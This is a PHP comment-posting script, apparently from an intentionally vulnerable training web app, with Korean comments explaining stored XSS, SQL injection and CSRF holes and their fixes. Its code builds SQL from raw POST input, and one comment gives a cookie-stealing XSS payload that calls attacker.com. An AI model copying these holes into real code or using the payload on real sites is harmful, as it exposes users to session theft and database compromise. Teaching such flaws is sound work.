<?php
// =============================================================================
// add_comment.php - 댓글 추가 (XSS 취약점 포함)
// =============================================================================
//
// 이 파일의 기능:
// - 사용자가 게시물에 댓글을 추가하는 기능
//
// ⚠️ 주요 보안 취약점:
// 1. XSS (Cross-Site Scripting) 취약점
//    → 사용자 입력을 필터링 없이 DB에 저장
//    → 나중에 화면에 출력될 때 XSS 공격 가능 (Stored XSS)
//
// 2. SQL Injection 취약점
//    → $post_id, $content를 직접 쿼리에 삽입
//    → Prepared Statement 미사용
//
// 3. CSRF (Cross-Site Request Forgery) 취약점
//    → CSRF 토큰 검증 없음
//    → 악의적인 사이트에서 이 API를 호출할 수 있음
//
// 올바른 방어 방법:
// - htmlspecialchars()로 출력 시 인코딩
// - Prepared Statement 사용
// - CSRF 토큰 검증

include 'config.php';
requireLogin();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $post_id = $_POST['post_id'];
    $content = $_POST['content'];
    $user_id = $_SESSION['user_id'];

    $conn = getConnection();

    // =============================================================================
    // ⚠️ 취약점 1: XSS (Stored XSS) 취약점
    // =============================================================================
    //
    // 문제점:
    // - 사용자가 입력한 $content를 필터링 없이 그대로 DB에 저장
    // - HTML 태그, JavaScript 코드가 포함되어도 그대로 저장됨
    //
    // 공격 예시:
    // 입력: <script>alert('XSS')</script>
    // → DB에 그대로 저장됨
    // → 다른 사용자가 댓글을 볼 때 JavaScript가 실행됨
    // → 쿠키 탈취, 세션 하이재킹 등 가능
    //
    // 더 위험한 공격:
    // <img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
    // → 사용자의 쿠키를 공격자 서버로 전송
    //
    // =============================================================================
    // ⚠️ 취약점 2: SQL Injection 취약점
    // =============================================================================
    //
    // 문제점:
    // - $post_id, $content, $user_id를 직접 쿼리에 삽입
    // - Prepared Statement를 사용하지 않음
    //
    // 올바른 코드:
    // $stmt = $conn->prepare("INSERT INTO comments (post_id, user_id, content) VALUES (?, ?, ?)");
    // $stmt->bind_param("iis", $post_id, $user_id, $content);
    // $stmt->execute();
    $query = "INSERT INTO comments (post_id, user_id, content)
              VALUES ($post_id, $user_id, '$content')";

    $conn->query($query);
    $conn->close();
}

// 댓글 추가 후 메인 페이지로 리다이렉트
header('Location: index.php');
exit();
?>
